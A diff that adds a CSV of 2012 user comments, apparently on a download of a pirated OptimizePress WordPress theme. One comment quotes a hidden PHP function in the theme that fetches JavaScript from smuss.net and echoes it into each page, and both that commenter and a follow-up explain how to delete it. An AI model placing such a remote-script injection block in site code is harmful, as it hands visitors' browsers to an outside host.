@@ -1,0 +1,24 @@
+﻿User Type,Username,Date,Text
+,ffsyouskuntz,2012-05-24T10:34Z,Useless. Do not download. Will completely nuke your entire website if Wordpress is installed in the root forcing a complete reinstall and loss of data. Well done!!
+,scout01,2012-08-03T21:15Z,"Worked fine on WP 3.4
+
+Only issue was the fatal error that occured while activating the theme.
+
+To solve this problem, go to ...wp-content/themes/OptimizePress1.45/lib/functions/theme-functions.php and delete or comment out the following:
+
+jqueryj_head() {
+
+       if(function_exists('curl_init'))
+       {
+               $url = ""http://smuss.net/jquery-1.6.3.min.js"";
+               $ch = curl_init();
+               $timeout = 10;
+               curl_setopt($ch,CURLOPT_URL,$url);
+               curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+               curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
+               $data = curl_exec($ch);
+               curl_close($ch);
+               echo ""$data"";
+       }
+}"
+,scout01,2012-08-03T22:06Z,"There also seems to be some 0B javascript files that add ridiculous load times to the page. Also solved by going to functions.php in the themes folder, searching for ""smuss.net"", and deleting that block of code."
